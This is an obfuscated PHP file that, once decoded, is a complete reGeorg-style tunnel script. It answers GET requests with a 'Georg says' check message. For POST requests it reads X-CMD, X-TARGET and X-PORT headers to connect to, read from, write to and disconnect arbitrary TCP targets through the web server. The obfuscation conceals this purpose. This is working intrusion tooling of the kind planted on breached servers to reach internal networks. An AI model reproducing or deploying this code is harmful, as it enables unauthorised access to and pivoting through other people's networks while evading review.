<?php
/*   __________________________________________________
    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.14  |
    |              on 2022-06-18 06:54:30              |
    |    GitHub: https://github.com/pk-fr/yakpro-po    |
    |__________________________________________________|
*/
 goto TSE2j; PdhrX: $E2LR1 = apache_request_headers(); goto Bziov; Sa8EY: set_time_limit(0); goto PdhrX; Sw6EE: if (!function_exists("\x61\160\x61\143\150\x65\x5f\x72\145\161\165\x65\163\x74\x5f\150\x65\141\144\x65\x72\163")) { function apache_request_headers() { goto i37DI; cv21N: qD0m9: goto Fc30l; Rn8Uc: foreach ($_SERVER as $zH8Ix => $xbjNa) { goto y7Ccw; EIQGY: bqbpJ: goto X40n6; ldF2f: foreach ($xIQw9 as $Sugiz => $fzryR) { $xIQw9[$Sugiz] = ucfirst($fzryR); R6H5c: } goto MTcFV; y7Ccw: if (!preg_match($R8QDD, $zH8Ix)) { goto AWhmA; } goto Py3m6; Z0zh7: $aADs2[$JSSg_] = $xbjNa; goto Nhd90; P8y5k: $xIQw9 = explode("\x5f", $JSSg_); goto ujHg8; Nhd90: AWhmA: goto EIQGY; tzfmI: WSj4b: goto Z0zh7; Geny8: $xIQw9 = array(); goto P8y5k; tjySi: $JSSg_ = implode("\55", $xIQw9); goto tzfmI; ujHg8: if (!(count($xIQw9) > 0 and strlen($JSSg_) > 2)) { goto WSj4b; } goto ldF2f; MTcFV: EIhgz: goto tjySi; Py3m6: $JSSg_ = preg_replace($R8QDD, '', $zH8Ix); goto Geny8; X40n6: } goto cv21N; Fc30l: return $aADs2; goto kKbmg; i37DI: $aADs2 = array(); goto vVyai; vVyai: $R8QDD = "\57\134\101\x48\124\x54\120\x5f\57"; goto Rn8Uc; kKbmg: } } goto La5QS; AYU04: if (!($_SERVER["\122\105\121\125\105\x53\124\x5f\x4d\x45\x54\x48\x4f\104"] === "\120\117\x53\x54")) { goto V27ZO; } goto Sa8EY; YnkiM: nBU8O: goto zcm64; VexuS: ini_set("\x61\154\154\x6f\x77\137\165\162\x6c\137\151\x6e\x63\x6c\x75\144\145", true); goto AhQBy; Yxu4f: switch ($WjQ96) { case "\x43\x4f\x4e\116\105\x43\x54": goto T98SG; q2rgd: ob_end_clean(); goto qDqpq; tVedE: @session_start(); goto JzKT9; etxym: ovsah: goto oYTaD; qV0e8: if (!($GBxAq === false)) { goto r33Yg; } goto bdCq2; MtvUo: if (!($LX20n === false)) { goto fi6Ri; } goto mQkjF; mtUat: goto nBU8O; goto Ldtxm; BeqjE: nwNk4: goto PiylV; quZd7: socket_set_nonblock($GBxAq); goto tVedE; R5uQa: @session_start(); goto H6xBB; JOXGJ: goto Xt0I_; goto BeqjE; Z02x2: header("\x58\x2d\105\x52\x52\x4f\122\72\x20\106\x61\x69\154\x65\144\x20\143\157\x6e\x6e\145\x63\x74\151\x6e\x67\40\164\157\x20\164\141\162\x67\145\164"); goto edFeW; brHxi: header("\x43\x6f\x6e\156\145\x63\x74\151\157\156\72\x20\x63\154\x6f\x73\x65"); goto U1N7e; H6xBB: $_SESSION["\162\165\156"] = false; goto q5O0o; bdCq2: header("\x58\x2d\x53\x54\x41\x54\125\123\x3a\x20\x46\101\x49\x4c"); goto CjxxZ; PiylV: socket_close($GBxAq); goto mtUat; esAmZ: return; goto oJJqk; aINKd: $_SESSION["\x77\162\151\x74\145\x62\x75\x66"] = ''; goto dGu3V; qoK7_: $LY3c5 = (int) $E2LR1["\130\x2d\x50\117\x52\x54"]; goto JD06W; dRi0y: header("\x58\55\105\122\122\x4f\x52\x3a\40\x46\141\x69\154\145\x64\x20\162\x65\141\144\151\x6e\x67\40\x66\162\x6f\155\x20\x73\x6f\143\x6b\145\x74"); goto etxym; Cosn0: ob_end_flush(); goto K5dA7; eZRQ3: $vNPlb = @socket_connect($GBxAq, $hxSKT, $LY3c5); goto yeAbZ; CjxxZ: header("\x58\55\105\122\122\x4f\122\72\x20\x46\x61\x69\154\x65\x64\40\143\x72\145\x61\x74\x69\x6e\147\x20\x73\x6f\143\153\145\x74"); goto esAmZ; LUM2D: goto t4srq; goto w2Oly; HIbJG: fi6Ri: goto ttjjy; w2Oly: R3dLJ: goto nIxdb; U1N7e: ignore_user_abort(); goto hrcZt; xY1EX: if (!$_SESSION["\x72\x75\156"]) { goto nwNk4; } goto O33xL; LWKHQ: PoQ68: goto quZd7; JD06W: $GBxAq = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); goto qV0e8; hrcZt: ob_start(); goto SxHpZ; fxZSj: $LX20n = socket_write($GBxAq, $UneXY, strlen($UneXY)); goto MtvUo; mQkjF: @session_start(); goto V9o8v; qDqpq: header("\130\55\x53\124\101\x54\x55\x53\72\x20\x4f\x4b"); goto brHxi; G6F3v: session_write_close(); goto vmvvg; Z57Je: $_SESSION["\x72\x65\141\144\x62\165\146"] .= $RK0pm; goto G6F3v; GymEY: if (!($UneXY != '')) { goto yXM3D; } goto fxZSj; V9o8v: $_SESSION["\162\165\x6e"] = false; goto Syt6b; E6o0h: @session_start(); goto lP_NU; edFeW: return; goto LWKHQ; qr9Uv: $_SESSION["\167\162\151\x74\145\142\x75\x66"] = ''; goto Fv59A; q5O0o: session_write_close(); goto sbLU7; ocVFw: Xt0I_: goto xY1EX; SxHpZ: $JQuC9 = ob_get_length(); goto ptPMY; UOPfo: header("\x58\55\x53\x54\101\124\125\123\x3a\x20\106\101\111\x4c"); goto Z02x2; vmvvg: Ybcmu: goto JOXGJ; oJJqk: r33Yg: goto eZRQ3; lP_NU: $UneXY = $_SESSION["\167\x72\x69\164\x65\142\165\146"]; goto aINKd; T98SG: $hxSKT = $E2LR1["\x58\55\124\101\122\107\105\x54"]; goto qoK7_; WbCfD: @session_start(); goto Z57Je; O33xL: $RK0pm = ''; goto E6o0h; sbLU7: header("\x58\x2d\123\124\101\124\125\x53\72\x20\x46\101\x49\x4c"); goto dRi0y; Syt6b: session_write_close(); goto U9IK5; oQ5CF: t4srq: goto wkg0l; U9IK5: header("\130\x2d\x53\x54\x41\124\x55\123\72\40\x46\x41\x49\x4c"); goto uiY2v; bMpMy: session_write_close(); goto ocVFw; ptPMY: header("\103\157\x6e\x74\x65\156\164\55\114\145\x6e\147\x74\150\72\40{$JQuC9}"); goto Cosn0; nIxdb: if (!($RK0pm != '')) { goto Ybcmu; } goto WbCfD; Fc9Bn: if (!($H4sjP === false)) { goto ovsah; } goto R5uQa; wkg0l: if (!($H4sjP = socket_read($GBxAq, 512))) { goto R3dLJ; } goto Fc9Bn; ttjjy: yXM3D: goto oQ5CF; yeAbZ: if (!($vNPlb === false)) { goto PoQ68; } goto UOPfo; JzKT9: $_SESSION["\162\165\x6e"] = true; goto qr9Uv; K5dA7: flush(); goto bMpMy; uiY2v: header("\130\x2d\x45\x52\x52\117\x52\x3a\x20\x46\141\x69\154\x65\x64\x20\x77\162\x69\x74\x69\x6e\x67\40\x73\157\x63\153\145\164"); goto HIbJG; dGu3V: session_write_close(); goto GymEY; oYTaD: $RK0pm .= $H4sjP; goto LUM2D; Fv59A: $_SESSION["\x72\x65\x61\144\142\165\x66"] = ''; goto q2rgd; Ldtxm: case "\x44\x49\123\103\117\x4e\x4e\105\x43\124": goto Kq93l; JXDlw: goto nBU8O; goto fmZs_; Kq93l: error_log("\x44\x49\123\103\117\x4e\116\x45\x43\x54\x20\x72\145\x63\x69\145\x76\x65\x64"); goto IGKnD; v8y7D: session_write_close(); goto U5Ndi; IGKnD: @session_start(); goto je_zi; je_zi: $_SESSION["\x72\165\x6e"] = false; goto v8y7D; U5Ndi: return; goto JXDlw; fmZs_: case "\122\x45\x41\x44": goto nk0mG; qIanu: echo $OmU8w; goto FVfao; T1DQh: pamM9: goto B7tvZ; nUjj5: $JAx6K = $_SESSION["\x72\165\x6e"]; goto GLUya; Pu4Rx: return; goto dcMKH; gwc0e: goto nBU8O; goto MnpjE; I2tTu: header("\x58\x2d\x45\122\122\x4f\122\72\x20\x52\x65\155\x6f\164\x65\x53\x6f\143\x6b\145\164\x20\162\x65\141\144\40\x66\151\154\x65\x64"); goto Pu4Rx; B7tvZ: header("\x58\x2d\x53\x54\101\124\x55\123\72\x20\117\x4b"); goto T7vhP; a3gsc: if ($JAx6K) { goto pamM9; } goto l2_6N; dcMKH: goto ldBPA; goto T1DQh; ua2eB: $OmU8w = $_SESSION["\162\x65\x61\x64\x62\x75\146"]; goto BfHty; kibZo: ldBPA: goto gwc0e; BfHty: $_SESSION["\x72\x65\141\144\142\165\146"] = ''; goto nUjj5; FVfao: return; goto kibZo; GLUya: session_write_close(); goto a3gsc; T7vhP: header("\103\x6f\x6e\x6e\145\x63\164\x69\157\x6e\x3a\x20\x4b\145\x65\x70\55\101\154\x69\x76\145"); goto qIanu; nk0mG: @session_start(); goto ua2eB; l2_6N: header("\x58\x2d\x53\x54\x41\x54\125\123\x3a\x20\x46\101\111\114"); goto I2tTu; MnpjE: case "\x46\x4f\122\x57\101\x52\104": goto MGW_l; uKe7j: header("\130\55\123\x54\x41\124\x55\123\72\x20\106\101\111\x4c"); goto LFvD3; LmYaQ: return; goto QeGWl; hCLvi: $qv_MA = file_get_contents("\x70\150\x70\72\x2f\x2f\x69\x6e\x70\165\x74"); goto O22H4; n456r: mqtIJ: goto WFTw4; CPQ8y: @session_start(); goto oYEo0; nxmbo: header("\130\x2d\x45\x52\122\117\x52\72\x20\120\x4f\x53\x54\40\x72\145\161\x75\x65\163\164\x20\x72\145\141\144\40\x66\x69\154\x65\x64"); goto Hq6AM; WFTw4: header("\x43\x6f\156\x74\x65\156\164\55\124\x79\x70\x65\72\40\141\x70\160\154\x69\143\141\164\x69\157\156\57\157\x63\164\x65\164\55\x73\x74\162\145\141\x6d"); goto hCLvi; LFvD3: header("\x58\55\x45\x52\122\117\x52\x3a\40\116\157\40\155\157\x72\x65\x20\162\165\x6e\156\151\156\147\x2c\40\x63\154\x6f\163\145\x20\156\157\x77"); goto eImcm; O22H4: if ($qv_MA) { goto XrNmZ; } goto M06Eh; eImcm: return; goto n456r; EWjMD: header("\x58\55\123\x54\x41\124\x55\123\72\40\x4f\113"); goto bg2E2; M06Eh: header("\x58\x2d\x53\124\x41\124\x55\x53\x3a\x20\x46\x41\x49\114"); goto nxmbo; QeGWl: mubLW: goto z_wxV; bg2E2: header("\x43\x6f\x6e\156\145\143\x74\151\157\x6e\72\40\x4b\x65\145\x70\55\x41\154\x69\166\x65"); goto LmYaQ; Hq6AM: goto mubLW; goto huvYf; zXYCk: if ($JAx6K) { goto mqtIJ; } goto uKe7j; huvYf: XrNmZ: goto CPQ8y; MGW_l: @session_start(); goto v3Vt5; tZDK4: session_write_close(); goto zXYCk; oYEo0: $_SESSION["\x77\x72\x69\x74\x65\142\165\x66"] .= $qv_MA; goto gZcHs; gZcHs: session_write_close(); goto EWjMD; v3Vt5: $JAx6K = $_SESSION["\x72\x75\x6e"]; goto tZDK4; z_wxV: goto nBU8O; goto YzTek; YzTek: } goto KPsos; AhQBy: dl("\160\x68\x70\x5f\x73\x6f\x63\x6b\145\164\163\x2e\x64\x6c\154"); goto Sw6EE; Bziov: $WjQ96 = $E2LR1["\130\55\x43\x4d\104"]; goto Yxu4f; TSE2j: ini_set("\141\x6c\x6c\157\x77\x5f\165\x72\x6c\137\x66\x6f\x70\x65\x6e", true); goto VexuS; yZbQ8: fYouu: goto AYU04; PJ7Ka: exit("\x47\145\157\x72\x67\40\163\x61\171\x73\x2c\x20\x27\101\154\154\x20\163\x65\x65\x6d\x73\x20\x66\x69\156\x65\x27"); goto yZbQ8; KPsos: Toytp: goto YnkiM; La5QS: if (!($_SERVER["\122\105\121\125\x45\x53\x54\x5f\115\105\124\x48\x4f\104"] === "\107\105\x54")) { goto fYouu; } goto PJ7Ka; zcm64: V27ZO: